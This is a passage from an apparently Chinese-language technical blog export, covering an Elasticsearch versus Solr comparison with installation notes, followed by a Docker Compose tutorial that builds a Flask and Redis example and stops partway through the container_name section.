title="Elasticsearch Or Solr"></a>Elasticsearch Or Solr</h2><p>Elasticsearch 和 Solr 都是开源搜索引擎，那么我们在使用时该如何选择呢？</p><ul><li><p>Google 搜索趋势结果表明，与 Solr 相比，Elasticsearch 具有很大的吸引力，但这并不意味着 Apache Solr 已经死亡。虽然有些人可能不这么认为，但 Solr 仍然是最受欢迎的搜索引擎之一，拥有强大的社区和开源支持。</p></li><li><p>与 Solr 相比，Elasticsearch 易于安装且非常轻巧。此外，你可以在几分钟内安装并运行Elasticsearch。但是，如果 Elasticsearch 管理不当，这种易于部署和使用可能会成为一个问题。基于 JSON 的配置很简单，但如果要为文件中的每个配置指定注释，那么它不适合您。总的来说，如果你的应用使用的是 JSON，那么Elasticsearch 是一个更好的选择。否则，请使用 Solr，因为它的 schema.xml 和 solrconfig.xml 都有很好的文档记录。</p></li><li><p>Solr 拥有更大，更成熟的用户，开发者和贡献者社区。ES 虽拥有的规模较小但活跃的用户社区以及不断增长的贡献者社区。Solr 贡献者和提交者来自许多不同的组织，而 Elasticsearch 提交者来自单个公司。</p></li><li><p>Solr 更成熟，但 ES 增长迅速，更稳定。</p></li><li><p>Solr 是一个非常有据可查的产品，具有清晰的示例和 API 用例场景。 Elasticsearch 的 文档组织良好，但它缺乏好的示例和清晰的配置说明。</p></li></ul><p><strong>那么，到底是 Solr 还是 Elasticsearch？</strong></p><p>有时很难找到明确的答案。无论您选择 Solr 还是 Elasticsearch，首先需要了解正确的用例和未来需求。总结他们的每个属性。</p><ul><li><p>由于易于使用，Elasticsearch 在新开发者中更受欢迎。一个下载和一个命令就可以启动一切。</p></li><li><p>如果除了搜索文本之外还需要它来处理分析查询，Elasticsearch 是更好的选择</p></li><li><p>如果需要分布式索引，则需要选择 Elasticsearch。对于需要良好可伸缩性和以及性能分布式环境，Elasticsearch 是更好的选择。</p></li><li><p>Elasticsearch 在开源日志管理用例中占据主导地位，许多组织在 Elasticsearch 中索引它们的日志以使其可搜索。</p></li><li><p>如果你喜欢监控和指标，那么请使用 Elasticsearch，因为相对于 Solr，Elasticsearch 暴露了更多的关键指标</p></li></ul><hr><h2 id="Elasticsearch-应用案例"><a href="#Elasticsearch-应用案例" class="headerlink" title="Elasticsearch 应用案例"></a>Elasticsearch 应用案例</h2><ul><li>GitHub: 2013 年初，抛弃了 Solr，采取 Elasticsearch 来做 PB 级的搜索。“GitHub 使用Elasticsearch 搜索 20TB 的数据，包括 13 亿文件和 1300 亿行代码”。 </li><li>维基百科：启动以 Elasticsearch 为基础的核心搜索架构</li><li>SoundCloud：“SoundCloud 使用 Elasticsearch 为 1.8 亿用户提供即时而精准的音乐搜索服务”。 </li><li>百度：目前广泛使用 Elasticsearch 作为文本数据分析，采集百度所有服务器上的各类指标数据及用户自定义数据，通过对各种数据进行多维分析展示，辅助定位分析实例异常或业务层面异常。目前覆盖百度内部 20 多个业务线（包括云分析、网盟、预测、文库、直达号、钱包、风控等），单集群最大 100 台机器，200 个 ES 节点，每天导入 30TB+数据。</li><li>新浪：使用 Elasticsearch 分析处理 32 亿条实时日志。</li><li>阿里：使用 Elasticsearch 构建日志采集和分析体系。</li><li>Stack Overflow：解决 Bug 问题的网站，全英文，编程人员交流的网站。</li></ul><hr><h2 id="Elasticsearch-安装"><a href="#Elasticsearch-安装" class="headerlink" title="Elasticsearch 安装"></a>Elasticsearch 安装</h2><p>Elasticsearch 的官方地址：<a href="https://www.elastic.co/cn/elasticsearch/">https://www.elastic.co/cn/elasticsearch/</a></p><table><thead><tr><th>目录</th><th>含义</th></tr></thead><tbody><tr><td>bin</td><td>可执行脚本目录</td></tr><tr><td>config</td><td>配置目录</td></tr><tr><td>jdk</td><td>内置JDK目录</td></tr><tr><td>lib</td><td>类库</td></tr><tr><td>logs</td><td>日志目录</td></tr><tr><td>modules</td><td>模块目录</td></tr><tr><td>plugins</td><td>插件目录</td></tr></tbody></table><p>解压后，进入 bin 文件目录，点击 elasticsearch.bat 文件右键以管理员身份打开启动 ES 服务</p><blockquote><p><strong>注意：</strong>9300 端口为 Elasticsearch 集群间组件的通信端口，9200 端口为浏览器访问的 http协议 RESTful 端口。</p></blockquote><p>打开浏览器（推荐使用谷歌浏览器），输入地址：<a href="http://localhost:9200，测试结果如下则说明启动成功：">http://localhost:9200，测试结果如下则说明启动成功：</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SC-201902132344&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;cluster_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;elasticsearch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;cluster_uuid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;b38xUXCJRU--aI0l7GL7Fw&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;number&quot;</span><span class="punctuation">:</span> <span class="string">&quot;7.15.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build_flavor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;default&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build_type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;zip&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build_hash&quot;</span><span class="punctuation">:</span> <span class="string">&quot;83c34f456ae29d60e94d886e455e6a3409bba9ed&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build_date&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2021-10-07T21:56:19.031608185Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build_snapshot&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;lucene_version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8.9.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;minimum_wire_compatibility_version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6.8.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;minimum_index_compatibility_version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6.0.0-beta1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tagline&quot;</span><span class="punctuation">:</span> <span class="string">&quot;You Know, for Search&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><hr><p><strong>问题解决</strong></p><ul><li>Elasticsearch 是使用 java 开发的，且 7.8 版本的 ES 需要 JDK 版本 1.8 以上，默认安装包带有 jdk 环境，如果系统配置 JAVA_HOME，那么使用系统默认的 JDK，如果没有配置使用自带的 JDK，一般建议使用系统配置JDK。 </li><li>双击启动窗口闪退，通过路径访问追踪错误，如果是“空间不足”，请修改<code>config/jvm.options</code> 配置文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 设置 JVM 初始内存为 1G。此值可以设置与-Xmx 相同，以避免每次垃圾回收完成后 JVM 重新分配内存</span><br><span class="line"># Xms represents the initial size of total heap space</span><br><span class="line"># 设置 JVM 最大可用内存为 1G</span><br><span class="line"># Xmx represents the maximum size of total heap space</span><br><span class="line">-Xms1g</span><br><span class="line">-Xmx1g</span><br></pre></td></tr></table></figure><hr>]]></content>
      
      
      <categories>
          
          <category> ElasticSearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticSearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker Compose</title>
      <link href="/posts/51962/"/>
      <url>/posts/51962/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考视频：编程不良人的Docker-Compose实战教程  <a href="https://www.bilibili.com/video/BV1ZT4y1K75K?p=24">https://www.bilibili.com/video/BV1ZT4y1K75K?p=24</a></p></blockquote><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li><p>Compose是 Docker 官方的开源项目，可以轻松、高效的管理容器，实现对Docker容器集群的快速编排。定位是定义和运行多个Docker容器的应用。</p></li><li><p>我们自定义使用 Docker 时，需先编写 Dockerfile 文件，再使用 <code>docker build</code>、<code>docker run</code> 等命令操作容器。然而微服务架构的应用系统一般包含若干个微服务，每个微服务一般都会部署多个实例，如果每个微服务都要手动操作，那么维护量会很大而且效率会很低。</p></li><li><p>Compose项目由Python编写，实际上调用了Docker服务提供的API对容器进行管理。</p></li></ul><hr><p>官网相关介绍：</p><p><strong>Compose是一个用于定义和运行多容器Docker应用程序的工具</strong>。使用Compose，我们可以使用YAML文件来配置应用程序的服务。然后，只需一个命令，就可以从配置中创建并启动所有服务。</p><p>使用Compose基本上分为三步：</p><ol><li><p>使用<code>Dockerfile</code>定义应用程序的环境，以便可以在任何地方复制。</p></li><li><p>在<code>docker compose.yml</code>中定义组成应用程序的服务，以便它们可以在隔离的环境中一起运行。</p></li><li><p>运行<code>docker compose up</code>和<a href="https://docs.docker.com/compose/cli-command/">docker compose命令</a>启动并运行整个应用程序。我们也可以使用docker compose二进制文件运行<code>docker compose up</code>。</p></li></ol><blockquote><p>Compose的重要概念：</p><ul><li>服务(services)： 应用容器（web、redis、mysql、nginx…）</li><li>项目(project)： 由一组关联的应用容器组成的一个完整业务单元，在docker-compose.yml文件中定义</li></ul><p>Compose的默认管理对象是项目，通过子命令对项目的一组容器进行便捷的生命周期管理。</p></blockquote><h1 id="安装与卸载"><a href="#安装与卸载" class="headerlink" title="安装与卸载"></a>安装与卸载</h1><p><strong>下载：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">官网提供 （没有下载成功）</span></span><br><span class="line">sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">推荐使用国内地址</span></span><br><span class="line">curl -L https://get.daocloud.io/docker/compose/releases/download/1.29.2/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>可到<a href="https://docs.docker.com/compose/install/">官网</a>查看最新版本号</p><p>下载成功可在&#x2F;usr&#x2F;local&#x2F;bin&#x2F;目录下看到 docker-compose</p><p><strong>授权：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使docker-compose成为可执行文件</span></span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p><strong>查看版本号：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx bin]# docker-compose version</span><br><span class="line">docker-compose version 1.29.2, build 5becea4c</span><br><span class="line">docker-py version: 5.0.0</span><br><span class="line">CPython version: 3.7.10</span><br><span class="line">OpenSSL version: OpenSSL 1.1.0l  10 Sep 2019</span><br></pre></td></tr></table></figure><p><strong>卸载：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><h1 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h1><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>定义应用程序依赖项。</p><p>在此页面上，将构建一个在 Docker Compose 上运行的简单 Python Web 应用程序。该应用程序使用 Flask 框架并在 Redis 中维护一个命中计数器。</p><p>1.为项目创建一个目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> composetest</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> composetest</span></span><br></pre></td></tr></table></figure><p>2.在<code>composetest</code>项目目录中创建一个名为<code>app.py</code>的文件并粘贴以下内容的文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">cache = redis.Redis(host=<span class="string">&#x27;redis&#x27;</span>, port=<span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hit_count</span>():</span><br><span class="line">    retries = <span class="number">5</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> cache.incr(<span class="string">&#x27;hits&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> redis.exceptions.ConnectionError <span class="keyword">as</span> exc:</span><br><span class="line">            <span class="keyword">if</span> retries == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">raise</span> exc</span><br><span class="line">            retries -= <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    count = get_hit_count()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! I have been seen &#123;&#125; times.\n&#x27;</span>.<span class="built_in">format</span>(count)</span><br></pre></td></tr></table></figure><p>3.在项目目录中创建另一个文件<code>requirements.txt</code>并粘贴以下内容的文件：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flask</span><br><span class="line">redis</span><br></pre></td></tr></table></figure><h2 id="创建一个-Dockerfile"><a href="#创建一个-Dockerfile" class="headerlink" title="创建一个 Dockerfile"></a>创建一个 Dockerfile</h2><p>在此步骤中，将编写一个用于构建 Docker 映像的 Dockerfile。该图像包含 Python 应用程序所需的所有依赖项，包括 Python 本身。</p><p>在项目目录中，创建一个名为<code>Dockerfile</code>并粘贴以下内容的文件（<strong>注意：文件名一定要大小写一致</strong>）：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#从 Python 3.7 映像开始构建映像</span></span><br><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.7</span>-alpine</span><br><span class="line"></span><br><span class="line"><span class="comment">#将工作目录设置为/code</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /code</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置flask命令使用的环境变量</span></span><br><span class="line"><span class="keyword">ENV</span> FLASK_APP=app.py</span><br><span class="line"><span class="keyword">ENV</span> FLASK_RUN_HOST=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装 gcc 和其他依赖项</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apk add --no-cache gcc musl-dev linux-headers</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#复制requirements.txt并安装 Python 依赖项</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt requirements.txt</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install -r requirements.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#侦听端口 5000</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5000</span></span><br><span class="line"><span class="comment">#将.项目中的当前目录复制到.镜像中的workdir</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br><span class="line"><span class="comment">#将容器的默认命令设置为flask run</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;flask&quot;</span>, <span class="string">&quot;run&quot;</span>]</span></span><br></pre></td></tr></table></figure><h2 id="在-Compose-文件中定义服务"><a href="#在-Compose-文件中定义服务" class="headerlink" title="在 Compose 文件中定义服务"></a>在 Compose 文件中定义服务</h2><p><code>docker-compose.yml</code>在项目目录中创建一个名为的文件并粘贴以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.9&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;5000:5000&quot;</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;redis:alpine&quot;</span></span><br></pre></td></tr></table></figure><p>这个 Compose 文件定义了两个服务：web 和 redis</p><p>该<code>web</code>服务使用从<code>Dockerfile</code>当前目录中构建的映像。然后它将容器和主机绑定到暴露的端口<code>5000</code>， 此示例服务使用 Flask Web 服务器的默认端口<code>5000</code>。</p><p>该<code>redis</code>服务使用 从 Docker Hub 注册表中提取的公共<a href="https://registry.hub.docker.com/_/redis/">Redis</a>映像。</p><h2 id="使用-Compose-构建并运行应用程序"><a href="#使用-Compose-构建并运行应用程序" class="headerlink" title="使用 Compose 构建并运行应用程序"></a>使用 Compose 构建并运行应用程序</h2><p>在项目目录，通过<code>docker-compose up</code>运行启动应用程序。</p><p>启动成功可以通过访问<code>主机地址:5000</code>看到：Hello World! I have been seen 1 times. 刷新页面数字应该递增。</p><p>切换到另一个终端窗口，然后键入<code>docker image ls</code>以列出本地镜像。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker images</span><br><span class="line">REPOSITORY        TAG          IMAGE ID       CREATED          SIZE</span><br><span class="line">composetest_web   latest       712a70388fb3   15 minutes ago   184MB</span><br><span class="line">whyour/qinglong   latest       af93ec71ba86   5 days ago       364MB</span><br><span class="line">python            3.7-alpine   a436fb2c575c   5 days ago       41.9MB</span><br></pre></td></tr></table></figure><p>通过键入<code>docker ps</code>以列出正在运行的容器：</p><ul><li>默认的服务名：项目目录名_ 服务名 _num</li><li>多个服务器、集群：_num 副本数量（集群状态下，服务不可能只有一个运行实例）</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker ps</span><br><span class="line">CONTAINER ID  IMAGE       COMMAND    CREATED         STATUS          PORTS       NAMES</span><br><span class="line">b2e8d7af2c81  composetest_web  &quot;flask run&quot;  13 minutes ago  Up 13 minutes  0.0.0.0:5000-&gt;5000/tcp, :::5000-&gt;5000/tcp  composetest_web_1</span><br><span class="line">dd96803c2f4a  redis:alpine  &quot;docker-entrypoint.s…&quot;  13 minutes ago  Up 13 minutes  6379/tcp      composetest_redis_1</span><br></pre></td></tr></table></figure><p>通过键入<code>docker network ls</code>以列出docker的网络：</p><ul><li>项目中的服务都在同个网络下，可以通过容器名进行访问</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">[root@nanzx ~]# docker network ls</span><br><span class="line">NETWORK ID     NAME                  DRIVER    SCOPE</span><br><span class="line">cb43c4e5baa2   bridge                bridge    local</span><br><span class="line">09c06a901a32   composetest_default   bridge    local</span><br><span class="line">c5f5efea2089   host                  host      local</span><br><span class="line">b9e8be9bb948   none                  null      local</span><br><span class="line"></span><br><span class="line">[root@nanzx ~]# docker network inspect composetest_default</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Name&quot;: &quot;composetest_default&quot;,</span><br><span class="line">        &quot;Id&quot;: &quot;09c06a901a3215d2c4d03b47f51ade034a22212bb8251133c5a32f41c605bc00&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2021-09-13T22:31:16.22202105+08:00&quot;,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;bridge&quot;,</span><br><span class="line">        &quot;EnableIPv6&quot;: false,</span><br><span class="line">        &quot;IPAM&quot;: &#123;</span><br><span class="line">            &quot;Driver&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;Options&quot;: null,</span><br><span class="line">            &quot;Config&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Subnet&quot;: &quot;172.18.0.0/16&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;172.18.0.1&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Internal&quot;: false,</span><br><span class="line">        &quot;Attachable&quot;: true,</span><br><span class="line">        &quot;Ingress&quot;: false,</span><br><span class="line">        &quot;ConfigFrom&quot;: &#123;</span><br><span class="line">            &quot;Network&quot;: &quot;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;ConfigOnly&quot;: false,</span><br><span class="line">        &quot;Containers&quot;: &#123;</span><br><span class="line">            &quot;b2e8d7af2c81f67962bc036878ef7df07ce8774ec38e53cd7bc45e857ba3ef62&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;composetest_web_1&quot;,</span><br><span class="line">                &quot;EndpointID&quot;: &quot;4ee462ebcfe96a083593a10964651240023b1ea1b5a0610615935f733a80a9df&quot;,</span><br><span class="line">                &quot;MacAddress&quot;: &quot;02:42:ac:12:00:03&quot;,</span><br><span class="line">                &quot;IPv4Address&quot;: &quot;172.18.0.3/16&quot;,</span><br><span class="line">                &quot;IPv6Address&quot;: &quot;&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;dd96803c2f4ac049e50a555504b01d4706e5e6a57cb686202bcc11e1349bee76&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;composetest_redis_1&quot;,</span><br><span class="line">                &quot;EndpointID&quot;: &quot;4d33c44c5dbe12084bff474af9f11e0a67b4bb8c3a32c81782410615e7b4f680&quot;,</span><br><span class="line">                &quot;MacAddress&quot;: &quot;02:42:ac:12:00:02&quot;,</span><br><span class="line">                &quot;IPv4Address&quot;: &quot;172.18.0.2/16&quot;,</span><br><span class="line">                &quot;IPv6Address&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Labels&quot;: &#123;</span><br><span class="line">            &quot;com.docker.compose.network&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;com.docker.compose.project&quot;: &quot;composetest&quot;,</span><br><span class="line">            &quot;com.docker.compose.version&quot;: &quot;1.29.2&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>停止应用程序可以使用<code>docker-compose down</code> 或 Ctrl + C</p><p><strong>小结：以前都是单个 docker run 启动容器，现在可以通过docker-compose一键启动和停止所有服务。</strong></p><h1 id="常用模板指令"><a href="#常用模板指令" class="headerlink" title="常用模板指令"></a>常用模板指令</h1><p><a href="https://docs.docker.com/compose/compose-file/compose-file-v3/">官网：version参考中间栏目，yaml规则具体参考右侧栏目</a></p><p>中文参考手册:<a href="https://docker_practice.gitee.io/zh-cn/">https://docker_practice.gitee.io/zh-cn/</a></p><h2 id="yaml模板"><a href="#yaml模板" class="headerlink" title="yaml模板"></a>yaml模板</h2><p>默认的模板文件名称为 <code>docker-compose.yml</code>，格式为 YAML 格式。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#yaml可以大致分为3层</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.版本</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.服务</span></span><br><span class="line"><span class="string">services：</span></span><br><span class="line"><span class="attr">tomcat:</span> <span class="comment">#自定义服务名称</span></span><br><span class="line"><span class="comment">#服务配置</span></span><br><span class="line"><span class="string">image</span></span><br><span class="line"><span class="string">build</span></span><br><span class="line"><span class="string">network</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line">    <span class="attr">myRedis:</span> </span><br><span class="line">    <span class="string">...</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 3.其他配置：网络/卷、全局配置等</span></span><br><span class="line"><span class="string">volumes：</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line"><span class="attr">configs:</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li>每个服务都必须通过 <code>image</code> 指令指定镜像或 <code>build</code> 指令（需要 Dockerfile）等来自动构建生成镜像。</li><li>如果使用 <code>build</code> 指令，在 <code>Dockerfile</code> 中设置的选项(例如：<code>CMD</code>, <code>EXPOSE</code>, <code>VOLUME</code>, <code>ENV</code> 等) 将会自动被获取，无需在 <code>docker-compose.yml</code> 中重复设置。</li></ul><hr><h2 id="container-name"><a href="#container-name" class="headerlink" title="container_name"></a>container_name</h2><p>指定容器名称。默认将会使用 <code>项目名称_服务名称_序号</code> 这样的格式。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span 